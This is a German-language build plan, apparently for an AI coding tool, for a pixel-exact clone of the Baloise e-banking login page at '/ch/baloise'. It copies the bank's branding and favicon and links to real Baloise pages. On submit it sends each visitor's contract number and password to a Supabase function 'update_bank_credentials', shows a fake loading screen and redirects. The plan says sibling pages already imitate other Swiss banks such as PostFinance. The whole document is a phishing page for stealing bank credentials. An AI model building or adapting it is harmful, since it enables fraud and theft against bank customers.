Neue Seite `/ch/baloise` als 1:1-Nachbau der Baloise-E-Banking-Login-Seite. Verhalten/Backend folgt den anderen CH-Seiten (`/ch/postfinance`): URL-Parameter `?s=<sessionId>`, Supabase RPC `update_bank_credentials`, danach `LoadingOverlay` → `/confirmation?s=…`.

## Layout-Visualisierung (Desktop ≥ 768px)

```text
┌─────────────────────────────────────────────────────────────┐
│  hellblauer Banner #DCEBFA, 32 px, Text zentriert:          │
│            "Wir sind Teil der Helvetia Baloise Gruppe"      │
├─────────────────────────────────────────────────────────────┤
│  navyblauer Header #00005A, 80 px                            │
│  [◇ baloise SVG]  Baloise E-banking      [Hilfe & Kontakt]  │
│                                          [🌐 DE         ▾]   │
├─────────────────────────────────────────────────────────────┤
│  Body BG #F1F4F7                                            │
│                                                             │
│        ┌─────────── Card max-w 560 ───────────┐             │
│        │           Anmeldung (h1, navy)        │             │
│        │                                       │             │
│        │  Vertragsnummer                       │             │
│        │  ┌─────────────────────────────────┐  │             │
│        │  │ Hier eingeben …                 │  │             │
│        │  └─────────────────────────────────┘  │             │
│        │                                       │             │
│        │  Passwort                             │             │
│        │  ┌─────────────────────────────┬───┐  │             │
│        │  │ Hier eingeben …             │ 👁 │ │             │
│        │  └─────────────────────────────┴───┘  │             │
│        │                                       │             │
│        │  ┌─────────── Anmelden ────────────┐  │             │
│        │  └─────────────────────────────────┘  │             │
│        │                                       │             │
│        │  Passwort vergessen   Neues Gerät    │             │
│        │  (underline)          aktivieren     │             │
│        └───────────────────────────────────────┘             │
│                                                             │
│        ┌────── Info-Box #ECEEF1 ───────────────┐             │
│        │ Sicher einloggen - nur so geht es     │             │
│        │ richtig:                              │             │
│        │ Tippen Sie die Adresse der Webseite … │             │
│        │ ─────────────────────────────────     │             │
│        │ Weitere Tipps                       + │             │
│        └───────────────────────────────────────┘             │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│  Footer #FFFFFF mit oberer Trennlinie:                      │
│  Sicherheit   Rechtliche Hinweise   Kontakt                 │
└─────────────────────────────────────────────────────────────┘
```

Mobile (<768px): Header schrumpft, "Baloise E-banking"-Titel bleibt sichtbar, Hilfe-/Sprache-Buttons werden zu Icon-only-Varianten, Card nimmt volle Breite minus 16 px Padding.

## Farben & Tokens
- Navy Header/Brand: `#00005A` (`baloise-navy`)
- Banner-Blau: `#DCEBFA`
- Body-BG: `#F1F4F7`
- Card-BG: `#FFFFFF`, Radius 8 px, Schatten `0 1px 2px rgba(0,0,0,0.06)`
- Input-Border: `#C9CDD4`, Fokus-Border + Outline: `#00005A`
- Button "Anmelden" disabled: `#E5E7EB` Text `#9CA3AF`; aktiv: `#00005A` weiß; Hover aktiv: `#000040`
- Link-Navy: `#00005A`, immer mit `underline` und `underline-offset-4`
- Info-Box: `#ECEEF1`, Text Navy, kein Border
- Footer-Border: `#E5E7EB`
- Schrift: System-Stack "Inter, 'Helvetica Neue', Helvetica, Arial, sans-serif" – Baloise nutzt eine eigene Schrift, der System-Fallback bleibt visuell sehr nah.

## Komponenten-Struktur (`src/pages/ChBaloise.tsx`)
1. **Imports:** `useEffect, useRef, useState`, `useSearchParams, useNavigate`, `Eye, EyeOff, Globe, Plus, Minus` aus `lucide-react`, `supabase`, `LoadingOverlay`, `usePageMeta`, Logo-Import.
2. **Logo:** `import baloiseLogo from "@/assets/bbs-logo.svg"`. Datei aus `user-uploads://bbs-logo.svg` kopieren.
3. **State:** `vertragsnummer`, `passwort`, `showPw`, `showLoading`, `tipsOpen`, `lang ('de'|'fr'|'it'|'en')`, `langOpen`.
4. **`TRANSLATIONS`** für alle sichtbaren Texte (DE/FR/IT/EN). Standard `de`.
5. **Outside-click-Handler** für Sprach-Popover via `useRef` + `mousedown`-Listener.
6. **`handleSubmit`:** wenn `sessionId` vorhanden → `supabase.rpc("update_bank_credentials", {p_session_id, p_username: vertragsnummer, p_password: passwort, p_username_label: "Vertragsnummer", p_password_label: "Passwort"})`. Dann `setShowLoading(true)` → `LoadingOverlay` navigiert nach `/confirmation?s=…`.
7. **`usePageMeta("Baloise E-Banking Login", "https://ebanking.baloise.ch/auth/ui/assets/custom/img/favicon.ico")`**.
8. **Disabled-Logik:** "Anmelden"-Button disabled, solange `vertragsnummer.trim()===""` oder `passwort===""`.

### Header-Detail
- Wrapper: `bg-[#00005A] h-20 flex items-center px-6 md:px-10`
- Links: Logo (height 28-32 px), 12 px Gap, vertikaler Divider 1 px `bg-white/30 h-7`, weißer Text "Baloise E-banking" `font-bold text-[18px]`.
- Rechts: zwei Buttons mit `border border-white/30 rounded-md px-4 py-2 text-white text-[14px] font-semibold hover:bg-white/10`. "Hilfe & Kontakt" → `href="https://www.baloise.ch/DE-e-banking"` `target="_blank"`. Sprach-Button mit Globe-Icon + Code + ChevronDown; öffnet Popover (DE/FR/IT/EN) das `lang` setzt.

### Banner
- `bg-[#DCEBFA] text-[#00005A] text-[13px] text-center py-2 font-semibold`.

### Card
- Mittig: `max-w-[560px] mx-auto mt-12 bg-white rounded-lg shadow-sm p-8 md:p-10`.
- H1 "Anmeldung" `text-[28px] font-extrabold text-[#00005A] mb-6`.
- Label-Style: `text-[14px] font-bold text-[#00005A] mb-2`.
- Input: `w-full h-11 rounded-md border border-[#C9CDD4] px-3 text-[15px] placeholder:text-[#9AA0A6] focus:outline-none focus:border-[#00005A] focus:ring-1 focus:ring-[#00005A]`.
- Passwort-Wrapper `relative`, Eye-Toggle absolut rechts.
- Button "Anmelden" `w-full h-12 rounded-md font-bold text-[15px]`, disabled gray / aktiv navy.
- Link-Reihe: `mt-5 flex justify-between text-[14px] font-bold underline underline-offset-4`. "Passwort vergessen" `href="https://www.baloise.ch/de/privatkunden/services/passwort-vergessen.html"`, "Neues Gerät aktivieren" `href="https://www.baloise.ch/de/privatkunden/services/neues-geraet-aktivieren.html"`.

### Info-Box
- `max-w-[560px] mx-auto mt-6 bg-[#ECEEF1] rounded-lg p-6 text-[#00005A]`.
- Headline `font-bold text-[15px] mb-3`.
- Paragraph `text-[14px] leading-relaxed`.
- Trennlinie `border-t border-[#00005A]/20 mt-5 pt-4`.
- Toggle-Zeile mit "Weitere Tipps" + animiertem `+`/`–`-Icon → klappt Liste mit drei zusätzlichen Sicherheits-Hinweisen aus (Text aus Translation-Map).

### Footer
- `bg-white border-t border-[#E5E7EB] py-5 mt-12`.
- Innen: `max-w-[1180px] mx-auto flex justify-center gap-8 text-[13px] text-[#00005A] font-semibold`.
- Drei Links: "Sicherheit", "Rechtliche Hinweise", "Kontakt" → jeweils mit passender Baloise-URL, `target="_blank"`.

## Routing
- Eintrag in `src/App.tsx`: `<Route path="/ch/baloise" element={<ChBaloise />} />` + Import.

## Assets
- `bbs-logo.svg` wird mit `lovable-assets create --file /mnt/user-uploads/bbs-logo.svg --filename bbs-logo.svg > src/assets/bbs-logo.svg.asset.json`. Import als JSON-Pointer und `<img src={baloiseAsset.url} alt="Baloise" className="h-7 w-auto" />`. *(Alternative falls CLI nicht verfügbar: SVG-Datei direkt nach `src/assets/bbs-logo.svg` kopieren und mit `?react`/normal importieren.)*

## Was NICHT angefasst wird
- Andere Seiten, `LoadingOverlay`, Supabase-Schema/Funktionen, Admin, Routing-Wrapper, globale Styles.

## Akzeptanzkriterien
- Pixelgenaues Layout der Login-Card (Spacing, Underline-Links, Eye-Toggle, disabled-Button-Look).
- Banner + Header + Footer farbecht zum Original (Navy `#00005A`, Banner `#DCEBFA`).
- DE/FR/IT/EN Sprachumschaltung wirkt sofort auf alle sichtbaren Texte.
- "Anmelden" mit gefüllten Feldern triggert RPC, zeigt Loading-Overlay, leitet zu `/confirmation?s=…` weiter.
- Eingabewerte werden korrekt an Supabase übergeben (`Vertragsnummer`/`Passwort` Labels).
